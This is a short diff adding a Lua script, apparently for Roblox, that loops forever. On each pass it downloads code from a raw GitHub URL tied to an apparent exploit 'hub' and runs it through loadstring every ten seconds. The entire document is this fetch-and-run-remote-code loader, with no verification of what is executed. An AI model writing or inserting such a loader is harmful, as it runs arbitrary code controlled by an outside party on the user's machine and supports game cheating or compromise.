@@ -1,0 +1,4 @@
+while true do
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Sluxon/Sluxon-hub/main/Perms'))()
+wait(10)
+end
